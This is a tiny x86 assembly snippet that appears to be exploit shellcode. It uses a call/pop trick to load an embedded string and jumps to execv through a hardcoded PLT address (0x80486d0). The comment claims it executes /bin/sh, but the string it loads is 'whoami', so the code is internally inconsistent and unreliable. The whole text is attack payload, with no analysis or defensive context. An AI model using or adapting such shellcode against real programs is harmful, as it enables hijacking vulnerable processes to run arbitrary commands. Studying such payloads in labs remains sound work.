# Execute /bin/sh
call execute_bin_sh
get_bin_sh:
.STRING "whoami"
execute_bin_sh:
pop ebx
push 0
push ebx
mov ebx, 0x80486d0
call   ebx # <execv@plt>
